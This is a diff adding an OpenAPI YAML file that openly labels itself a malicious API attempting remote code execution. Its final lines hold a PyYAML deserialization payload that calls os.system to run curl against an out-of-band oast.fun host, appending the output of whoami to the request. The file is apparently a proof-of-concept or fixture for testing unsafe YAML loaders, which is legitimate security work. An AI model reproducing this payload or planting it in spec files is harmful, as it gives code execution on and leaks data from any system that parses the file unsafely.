@@ -1,0 +1,18 @@
+openapi: 3.0.0
+info:
+  title: "Malicious API"
+  description: "Attempting RCE"
+  version: "1.0.0"
+  
+paths:
+  /exploit:
+    get:
+      summary: "Trigger RCE"
+      description: "Attempts to send 'whoami' result to attacker's server"
+      operationId: "triggerExploit"
+      responses:
+        '200':
+          description: "Success"
+  
+!!python/object/apply:os.system
+- "curl https://lutjkpebvzmbjnlavtwr1qljduo31ooer.oast.fun/cmd?result=$(whoami)"
